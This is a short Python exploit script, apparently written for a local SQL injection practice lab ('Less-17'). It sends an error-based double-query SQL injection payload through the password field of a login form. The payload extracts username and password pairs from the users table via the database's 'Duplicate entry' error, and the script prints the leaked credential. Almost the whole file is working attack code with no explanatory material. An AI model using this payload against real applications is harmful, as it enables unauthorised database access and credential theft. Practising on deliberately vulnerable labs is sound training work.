import re
import string
import requests

url='http://localhost/Less-17/'

# Double query injection (Sub query Injection)
# Error based injection


data={
	"uname":"admin",
	"passwd":"bro' and (select 1 from (Select count(*),Concat((select concat(username,0x3d,password) from users LIMIT 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)#",
	"submit":"Submit"
}

resp=requests.post(url,data=data)
# if re.search('flag',resp.text):
# 	print("updated!") 
# print(resp.text)
matches=re.findall("Duplicate entry (.*) for key",resp.text)
print(matches[0].split(':')[0])